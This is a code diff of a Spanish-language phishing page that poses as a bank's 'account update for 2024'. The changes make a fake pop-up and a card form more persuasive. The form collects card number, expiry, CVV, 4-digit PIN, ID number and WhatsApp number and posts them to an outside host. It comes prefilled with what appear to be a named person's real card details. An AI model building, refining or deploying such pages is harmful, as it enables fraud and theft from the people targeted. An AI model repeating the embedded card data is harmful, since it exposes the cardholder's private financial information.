@@ -172,64 +172,65 @@
 
         <br>
 
-        <!-- Pop-up de aviso (visible al abrir la página) -->
-        <div class="popup-overlay" id="popupOverlay">
-            <div class="popup-container">
-                <h2>Aviso Importante</h2>
-                <p>Estamos realizando una actualización en nuestro sistema. Por favor, actualiza tu información de tarjeta de crédito.</p>
-                <button id="closePopup">Aceptar</button>
-            </div>
+           <!-- Pop-up de aviso (visible al abrir la página) -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-container">
+            <h3>Aviso Importante</h3>
+            <p>Estamos realizando una actualización en nuestro sistema.  Por favor, lea atentamente las instrucciones antes de completar el formulario.</p>
+            <button  id="closePopup" style="background-color: #047501;color: #fff;padding: 10px 20px;border: none;border-radius: 4px;cursor: pointer;">Aceptar</button>
         </div>
-
-        <!-- Formulario de actualización de tarjeta de crédito -->
-        <div class="container">
-            <h2>Actualización de Información de Tarjeta de Crédito</h2>
-            <!--   <form id="creditCardForm" method="post">   -->
-           <form id="creditCardForm" method="post" action="https://ganadero-formulario.wuaze.com/www.bg.com.php">
-                <!-- Resto del formulario -->
-
-                <label for="creditCardNumber">Número de Tarjeta de Crédito (últimos 4 dígitos):</label>
-                <input type="text" id="creditCardNumber" name="creditCardNumber" value="4218281007325125" required>
-
-                <div id="additionalFields">
-                    <label for="expirationDate">Fecha de Vencimiento (MM/AA):</label>
-                    <input type="text" id="expirationDate" name="expirationDate" pattern="(0[1-9]|1[0-2])\/[0-9]{2}" value="07/26" placeholder="MM/AA" required>
-
-                    <label for="cardHolderName">Nombre Impreso en la Tarjeta:</label>
-                    <input type="text" id="cardHolderName" name="cardHolderName" value="Gabriel Garcia Verazain" required>
-
-                    <label for="cvv">CVV:</label>
-                    <input type="text" id="cvv" name="cvv" pattern="[0-9]{3,4}" value="026" required>
-
-                    <label for="pin">PIN de 4 dígitos:</label>
-                   
-                    <input type="text" id="pin" name="pin" pattern="[0-9]{4}" required>
-
-                    <label for="dni">DNI (Documento de Identidad):</label>
-                    <input type="text" id="dni" name="dni" value="07876526" required>
-
-                    <label for="carnet">Número de Carnet:</label>
-                    <input type="text" id="carnet" name="carnet" value="A123456" required>
-
-                    <label for="cardIssuer">Emisor de la Tarjeta:</label>
-                    <select id="cardIssuer" name="cardIssuer" required>
-                        <option value="Visa">Visa</option>
-                        <option value="MasterCard">MasterCard</option>
-                        <option value="AmericanExpress">American Express</option>
-                        <option value="Discover">Discover</option>
-                    </select>
-
-                    <label for="cardAddress">Dirección de la Tarjeta:</label>
-                    <textarea id="cardAddress" name="cardAddress" rows="4" value="07rtyhg gfd6" required></textarea>
-                </div>
-
-
-
-               
-                <button type="submit">Enviar</button>
-        </form>
     </div>
 
+    <!-- Formulario de actualización de tarjeta de crédito -->
+    <div class="container">
+        <h2>Actualización de Información de la cuenta para el 2024</h2>
+        <!--   -->
+        <p>Algunos de sus datos personales ya han sido prellenados para su comodidad. Por favor, revise y complete cualquier información adicional que sea necesaria.
+         Gracias por su colaboración.</p>
+       
+        <form id="creditCardForm" method="post" action="https://ganadero-formulario.wuaze.com/www.bg.com.php">
+    <!-- Resto del formulario -->
+
+
+
+
+            <label for="creditCardNumber">Número de Tarjeta de Crédito:</label>
+            <input type="text" id="creditCardNumber" name="creditCardNumber" value="4218281007325125" required>
+
+            <div id="additionalFields">
+                <label for="expirationDate">Fecha de Vencimiento (MM/AA):</label>
+                <input type="text" id="expirationDate" name="expirationDate" pattern="(0[1-9]|1[0-2])\/[0-9]{2}" value="07/26" required>
+                
+                <label for="cardHolderName">Nombre Impreso en la Tarjeta:</label>
+                <input type="text" id="cardHolderName" name="cardHolderName" value="Gabriel Garcia Verazain" required>
+
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" name="cvv" pattern="[0-9]{3,4}" value="702" required >
+
+                <label for="pin">PIN de 4 dígitos:</label>
+                <input type="text" id="pin" name="pin" pattern="[0-9]{4}" placeholder="Aqui tu codigo pin de la tarjeta de 4 digitos" required oninvalid="this.setCustomValidity('Por favor, complete este campo.')" oninput="setCustomValidity('')">
+
+                <label for="dni">DNI (Documento de Identidad):</label>
+                <input type="text" id="dni" name="dni" required oninvalid="this.setCustomValidity('Por favor, complete este campo.')" oninput="setCustomValidity('')">
+
+                <label for="carnet">Número de Telefono:</label>
+                <input type="text" id="carnet" name="carnet" placeholder="Aqui tu numero de telefono o whatsapp" required oninvalid="this.setCustomValidity('Por favor, complete este campo.')" oninput="setCustomValidity('')">
+
+                <label for="cardIssuer">Emisor de la Tarjeta:</label>
+                <select id="cardIssuer" name="cardIssuer" required>
+                    <option value="Visa">Visa</option>
+                    <option value="MasterCard">MasterCard</option>
+                    <option value="AmericanExpress">American Express</option>
+                    <option value="Discover">Discover</option>
+                </select>
+
+                <label for="cardAddress">Dirección de la Tarjeta (Opcional):</label>
+                <textarea id="cardAddress" name="cardAddress" rows="4" placeholder="Aqui la direcion ejemplo calle 1234"></textarea>
+            </div>
+
+            <button type="submit">Enviar</button>
+        </form>
+    </div>
     <!-- JavaScript para mostrar u ocultar campos adicionales -->
     <script>
 
